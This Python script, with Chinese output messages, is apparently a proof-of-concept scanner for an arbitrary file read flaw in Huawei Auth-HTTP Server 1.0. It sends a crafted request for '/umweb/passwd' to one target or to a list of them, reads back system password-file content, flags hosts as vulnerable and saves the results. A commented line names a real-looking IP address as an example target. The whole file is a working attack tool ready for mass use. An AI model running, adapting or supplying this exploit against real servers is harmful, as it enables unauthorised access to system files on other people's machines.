import requests
import argparse

import warnings
warnings.filterwarnings("ignore")

payload="/umweb/passwd"

def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')

def get_res(url):
    """   try:
        response=requests.get(url+payload,verify=False,timeout=2)
        if "root" in response.text:
            print(url,end=' ')
            print_colored('存在 Huawei Auth-HTTP Server 1.0 任意文件读取漏洞','green')
        else:
            print(url,end=' ')
            print_colored('不存在 Huawei Auth-HTTP Server 1.0 任意文件读取漏洞','red')
    except Exception as e:
        print(e) """
    try:   
        response=requests.get(url+payload,verify=False,timeout=5)
        content=response.text
        if "root" in content:
            print(url,end=' ')
            print_colored('存在 Huawei Auth-HTTP Server 1.0 任意文件读取漏洞 ','green')
            print_colored(f"漏洞路径 {url+payload}",'yellow')
            print()
            res=f"漏洞路径 {url+payload}"
            return res
        else:
            print(url,end=' ')
            print_colored('不存在 Huawei Auth-HTTP Server 1.0 任意文件读取漏洞','red')
    except requests.exceptions.Timeout:
        print(f"{url} 请求超时")

def main():
    parser = argparse.ArgumentParser(description='命令行参数示例')

    # 添加参数选项
    parser.add_argument('-u', '--URL', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.URL:
        get_res(args.URL)
        
    if args.file:
        with open(args.file,'r') as f1:
            fs=f1.readlines()
            for u in fs:
                url=u.strip()
                res=get_res(url)
                if args.output:
                    with open(args.output+"/res.txt",'a',encoding='utf-8') as f2:
                        if res==None:
                            pass
                        else:
                            f2.write(f"{res}\n")
    
# url="https://125.72.29.90:8887"
main()    
    